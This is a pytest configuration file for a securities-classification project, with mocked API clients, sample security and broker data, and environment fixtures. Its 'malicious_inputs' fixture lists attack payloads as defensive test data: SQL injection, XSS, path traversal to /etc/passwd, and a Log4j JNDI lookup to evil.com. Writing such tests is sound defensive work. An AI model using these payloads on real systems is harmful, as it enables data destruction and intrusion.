"""
Pytest configuration for PP Security Master testing.
Provides comprehensive fixtures and test setup for all test types.
"""

import os
import pytest
from pathlib import Path
from typing import Generator, Any, Dict, List
from unittest.mock import MagicMock, patch
from decimal import Decimal
from datetime import datetime, date
import tempfile
import json


def pytest_runtest_setup(item) -> None:
    """Set coverage context based on test path and markers."""
    test_path = str(item.fspath)
    
    # Determine context from test path
    if "/tests/unit/" in test_path:
        context = "unit"
    elif "/tests/integration/" in test_path:
        context = "integration"
    elif "/tests/database/" in test_path:
        context = "database"
    elif "/tests/classifier/" in test_path:
        context = "classifier"
    elif "/tests/extractor/" in test_path:
        context = "extractor"
    elif "/tests/storage/" in test_path:
        context = "storage"
    elif "/tests/patch/" in test_path:
        context = "patch"
    elif "/tests/security/" in test_path:
        context = "security"
    elif "/tests/performance/" in test_path:
        context = "performance"
    else:
        context = "other"
    
    # Set environment variable for coverage context
    os.environ["COVERAGE_CONTEXT"] = context


# =============================================================================
# DATABASE FIXTURES
# =============================================================================

@pytest.fixture(scope="session")
def test_db_url() -> str:
    """Provide test database URL."""
    return "postgresql://test_user:test_pass@localhost:5432/test_pp_security_master"


@pytest.fixture
def mock_database_connection():
    """Mock database connection for unit tests."""
    mock_conn = MagicMock()
    mock_cursor = MagicMock()
    mock_conn.cursor.return_value.__enter__.return_value = mock_cursor
    return mock_conn


@pytest.fixture
def mock_sqlalchemy_engine():
    """Mock SQLAlchemy engine for unit tests."""
    with patch("sqlalchemy.create_engine") as mock_engine:
        yield mock_engine


# =============================================================================
# API CLIENT FIXTURES
# =============================================================================

@pytest.fixture
def mock_openfigi_client():
    """Mock OpenFIGI API client for testing."""
    mock_client = MagicMock()
    mock_client.classify_security.return_value = {
        "data": [{
            "figi": "BBG000B9XRY4",
            "securityType": "Common Stock",
            "compositeFIGI": "BBG000B9XRY4",
            "securityDescription": "APPLE INC",
            "ticker": "AAPL",
            "exchCode": "US",
            "shareClassFIGI": "BBG001S5N8V8"
        }]
    }
    return mock_client


@pytest.fixture
def mock_http_client():
    """Mock HTTP client for external API testing."""
    with patch("httpx.AsyncClient") as mock_client:
        yield mock_client


# =============================================================================
# SAMPLE DATA FIXTURES
# =============================================================================

@pytest.fixture
def sample_security_data() -> Dict[str, Any]:
    """Provide sample security data for testing."""
    return {
        "isin": "US0378331005",
        "symbol": "AAPL",
        "name": "Apple Inc.",
        "security_type": "equity",
        "currency": "USD",
        "exchange": "NASDAQ",
        "country": "US",
        "sector": "Technology",
        "industry": "Consumer Electronics"
    }


@pytest.fixture
def sample_fund_data() -> Dict[str, Any]:
    """Provide sample fund/ETF data for testing."""
    return {
        "isin": "US46090E1038",
        "symbol": "SPY",
        "name": "SPDR S&P 500 ETF Trust",
        "security_type": "fund",
        "currency": "USD",
        "exchange": "NYSE",
        "fund_type": "ETF",
        "expense_ratio": Decimal("0.0945"),
        "benchmark": "S&P 500 Index"
    }


@pytest.fixture
def sample_bond_data() -> Dict[str, Any]:
    """Provide sample bond data for testing."""
    return {
        "isin": "US912828R770",
        "symbol": "T 2.25 02/15/2052",
        "name": "United States Treasury Bond 2.25% 02/15/2052",
        "security_type": "bond",
        "currency": "USD",
        "maturity_date": date(2052, 2, 15),
        "coupon_rate": Decimal("2.25"),
        "credit_rating": "AAA"
    }


@pytest.fixture
def sample_broker_transaction() -> Dict[str, Any]:
    """Provide sample broker transaction for testing."""
    return {
        "transaction_id": "TXN-001",
        "date": date(2024, 1, 15),
        "symbol": "AAPL",
        "isin": "US0378331005",
        "type": "BUY",
        "quantity": Decimal("100"),
        "price": Decimal("185.50"),
        "fees": Decimal("9.95"),
        "currency": "USD",
        "account": "Investment-001",
        "broker": "Wells Fargo"
    }


# =============================================================================
# VALIDATION FIXTURES
# =============================================================================

@pytest.fixture(
    params=[
        "",  # Empty string
        "INVALIDX123",  # Invalid ISIN - wrong format
        "US0378331005" * 10,  # Too long
        None,  # None value
        123,  # Wrong type
        "US037833100",  # Too short ISIN
        "XX0378331005",  # Invalid country code
    ]
)
def invalid_isin_inputs(request):
    """Provide invalid ISIN inputs for edge case testing."""
    return request.param


@pytest.fixture
def invalid_symbol_inputs() -> List[Any]:
    """Provide invalid symbol inputs for testing."""
    return [
        "",  # Empty string
        None,  # None value
        123,  # Wrong type
        "A" * 20,  # Too long
        "!@#$%",  # Invalid characters
        " AAPL ",  # Leading/trailing spaces
    ]


@pytest.fixture
def security_classification_edge_cases() -> List[Dict[str, Any]]:
    """Provide edge cases for security classification testing."""
    return [
        {"input": None, "expected_error": "ValidationError"},
        {"input": "", "expected_error": "ValidationError"},
        {"input": {"no_isin": "value"}, "expected_error": "ValidationError"},
        {"input": {"isin": "INVALID"}, "expected_error": "ClassificationError"},
        {"input": {"isin": "US0378331005", "symbol": ""}, "expected_error": "ValidationError"},
    ]


# =============================================================================
# FILE FIXTURES
# =============================================================================

@pytest.fixture
def temp_directory() -> Generator[Path, None, None]:
    """Provide temporary directory for file testing."""
    with tempfile.TemporaryDirectory() as temp_dir:
        yield Path(temp_dir)


@pytest.fixture
def sample_pp_xml_file(temp_directory: Path) -> Path:
    """Create sample Portfolio Performance XML file for testing."""
    xml_content = """<?xml version="1.0" encoding="UTF-8"?>
<client version="0.65.0">
    <securities>
        <security uuid="12345-67890">
            <name>Apple Inc.</name>
            <isin>US0378331005</isin>
            <tickerSymbol>AAPL</tickerSymbol>
            <currency>USD</currency>
            <prices>
                <price t="2024-01-15" v="18550"/>
            </prices>
        </security>
    </securities>
    <accounts>
        <account uuid="account-001">
            <name>Investment Account</name>
            <transactions>
                <portfolio-transaction type="BUY">
                    <date>2024-01-15</date>
                    <security-uuid>12345-67890</security-uuid>
                    <shares>100000000</shares>
                    <grossValue>1855000</grossValue>
                    <fees>995</fees>
                    <taxes>0</taxes>
                </portfolio-transaction>
            </transactions>
        </account>
    </accounts>
</client>"""
    
    file_path = temp_directory / "sample_portfolio.xml"
    file_path.write_text(xml_content, encoding="utf-8")
    return file_path


@pytest.fixture
def sample_wells_csv_file(temp_directory: Path) -> Path:
    """Create sample Wells Fargo CSV file for testing."""
    csv_content = """Date,Description,Amount,Symbol,Quantity,Price
2024-01-15,BUY AAPL,"-1,855.00",AAPL,100,185.50
2024-01-20,DIVIDEND AAPL,23.00,AAPL,,
2024-02-01,SELL MSFT,"2,950.00",MSFT,25,118.00"""
    
    file_path = temp_directory / "sample_wells.csv"
    file_path.write_text(csv_content, encoding="utf-8")
    return file_path


@pytest.fixture 
def sample_ibkr_xml_file(temp_directory: Path) -> Path:
    """Create sample IBKR Flex Query XML file for testing."""
    xml_content = """<?xml version="1.0" encoding="UTF-8"?>
<FlexQueryResponse queryName="Test" type="AF">
    <FlexStatements>
        <FlexStatement>
            <Trades>
                <Trade symbol="AAPL" dateTime="2024-01-15" 
                       quantity="100" price="185.50" 
                       proceeds="-18550" commission="-1.0"
                       currency="USD" isin="US0378331005"/>
            </Trades>
        </FlexStatement>
    </FlexStatements>
</FlexQueryResponse>"""
    
    file_path = temp_directory / "sample_ibkr.xml"
    file_path.write_text(xml_content, encoding="utf-8")
    return file_path


# =============================================================================
# PERFORMANCE FIXTURES
# =============================================================================

@pytest.fixture
def benchmark_data() -> Dict[str, Any]:
    """Provide benchmark data for performance testing."""
    return {
        "large_security_list": [f"US{i:010d}" for i in range(1000)],
        "complex_classification_data": {
            "equities": 500,
            "funds": 300,
            "bonds": 200
        },
        "max_processing_time": 5.0  # seconds
    }


# =============================================================================
# CONFIGURATION FIXTURES
# =============================================================================

@pytest.fixture
def test_config() -> Dict[str, Any]:
    """Provide test configuration settings."""
    return {
        "database": {
            "url": "postgresql://test_user:test_pass@localhost:5432/test_db",
            "pool_size": 5,
            "max_overflow": 10
        },
        "openfigi": {
            "api_key": "test_api_key",
            "base_url": "https://api.openfigi.com/v3",
            "rate_limit": 10
        },
        "logging": {
            "level": "DEBUG",
            "format": "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
        },
        "security_master": {
            "batch_size": 100,
            "max_retries": 3,
            "timeout": 30
        }
    }


@pytest.fixture(autouse=True)
def setup_test_environment():
    """Automatically set up test environment variables."""
    test_env = {
        "TESTING": "true",
        "LOG_LEVEL": "DEBUG",
        "DATABASE_URL": "postgresql://test_user:test_pass@localhost:5432/test_db",
        "OPENFIGI_API_KEY": "test_api_key",
        "OPENFIGI_BASE_URL": "https://api.openfigi.com/v3"
    }
    
    # Store original values
    original_env = {}
    for key, value in test_env.items():
        original_env[key] = os.environ.get(key)
        os.environ[key] = value
    
    yield
    
    # Restore original values
    for key, value in original_env.items():
        if value is None:
            os.environ.pop(key, None)
        else:
            os.environ[key] = value


# =============================================================================
# MOCK FIXTURES
# =============================================================================

@pytest.fixture
def mock_logger():
    """Mock logger for testing."""
    return MagicMock()


@pytest.fixture
def mock_file_system():
    """Mock file system operations."""
    with patch("pathlib.Path.exists") as mock_exists, \
         patch("pathlib.Path.read_text") as mock_read, \
         patch("pathlib.Path.write_text") as mock_write:
        mock_exists.return_value = True
        yield {
            "exists": mock_exists,
            "read_text": mock_read,
            "write_text": mock_write
        }


# =============================================================================
# SECURITY TESTING FIXTURES
# =============================================================================

@pytest.fixture
def malicious_inputs() -> List[str]:
    """Provide malicious inputs for security testing."""
    return [
        "'; DROP TABLE securities; --",  # SQL injection
        "<script>alert('xss')</script>",  # XSS
        "../../etc/passwd",  # Path traversal
        "\x00\x01\x02\x03",  # Null bytes
        "A" * 10000,  # Buffer overflow attempt
        "${jndi:ldap://evil.com/a}",  # Log4j injection
        "{{7*7}}",  # Template injection
        "javascript:alert(1)",  # JavaScript injection
    ]


@pytest.fixture
def valid_but_edge_case_inputs() -> List[Dict[str, Any]]:
    """Provide valid but edge case inputs for robustness testing."""
    return [
        {"isin": "US" + "0" * 9, "name": ""},  # Valid ISIN, empty name
        {"isin": "GB0002634946", "name": "A" * 255},  # Maximum name length
        {"symbol": "BRK.A", "price": Decimal("0.01")},  # Minimum price
        {"symbol": "BRK.A", "price": Decimal("999999.99")},  # Maximum price
        {"date": date(1900, 1, 1)},  # Very old date
        {"date": date(2100, 12, 31)},  # Future date
    ]